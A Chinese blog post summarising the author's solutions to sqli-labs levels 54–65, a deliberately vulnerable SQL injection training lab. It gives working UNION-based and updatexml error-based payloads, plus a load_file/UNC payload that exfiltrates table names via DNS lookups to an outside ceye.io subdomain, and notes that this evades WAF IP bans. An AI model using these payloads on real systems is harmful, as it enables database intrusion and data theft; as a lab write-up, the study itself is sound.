---
layout: post 
title: "sqlilab做题总结（三）"
date: 2020-07-05
author: su29029
tags: Web
---


## sqlilab做题总结（三）

sqlilab今天正式做完一遍啦，今天最后把Less54-Less65完成。

首先这部分的题比较奇怪，限制了注入次数，超过了次数，表名列名字段名都会重置，导致我们进行注入测试的时候需要严格注意每一次注入的内容，其中后面的盲注对脚本的要求也相当高。

##### Less54-57

这四个提相对简单，常规的联合查询注入，注意一下闭合方式即可。

>总结一下常见的一些闭合方式：
>
>1.单引号闭合```'```
>
>2.双引号闭合```"```
>
>3.单引号加括号```')```'
>
>4.双引号加括号```'")```
>
>5.括号(仅限数字型注入)```)```
>
>6.单引号加双括号```'))```
>
>7.双引号加括号```"))```

这里以54为例注入，主要payload：

```sql
?id=0' union select 1,2,3 %23  # 判断列数
```

```sql
?id=0' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema="challenges"),3 %23    # 表名(数据库名已知故不需要获取)
```

```sql
?id=0' union select 1,(select group_concat(column_name) from information_schema.columns) where table_schema="challenges" and table_name="XXXXX"),3 %23  # 列名
```

##### Less58-61

这三个题也属于基础题，报错注入，同样注意一下闭合方式即可。payload(以58为例)：

```sql
?id=1' and updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema="challenges")),1) %23
```

##### Less62-65

这几个题难度较高，限制130次查询，盲注出key。

首先判断一下我们需要爆出的字符个数：

> 1.数据库名，已知
>
> 2.数据表名，10位
>
> 3.列名，secret_XXXX，4位
>
> 4.字段名，24位
>
> 共计38位。

相当于130次爆出38个字符，平均一个字符3-4次，传统二分法貌似无法实现。不过如果限制放宽一些的话(180-200次)的话，二分法脚本是可以完成的。

如果是Windows环境，这里可以考虑借助DNS来完成注入。首先注册一个ceye.io的账号，随后ceye.io会分配一个子域名，随机分配，这里用xxxxxx代替。load_file函数除了可以读取本地文件之外，也可以对形如```\\www.test.com```的url发起请求。

在Windows系统中，```\\```开头的会被识别为UNC路径。

> UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。

相当于```\\\www.test.com```被识别成了网络地址，这里请求的时候会进行dns解析，这里我们便可以通过将我们想要查询的信息写入url中，随后查看dns解析记录(dnslog)，信息便可以获取到了。

payload：

```sql
?id=1') and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema="challenges" limit 0,1),'.xxxxxx.ceye.io\\abc'))),1,1) %23
```

随后回到ceye.io查看解析记录，发现数据表名已经获得。

ps1.这个方法有局限性，必须是Windows系统，且mysql具有较高权限。

ps2.其他的需要盲注的题目，如果我们反复高频的发送请求，waf可能会ban掉我们的ip，这时如果我们借助这样的方式，就可以轻松的实现数据的读取了。
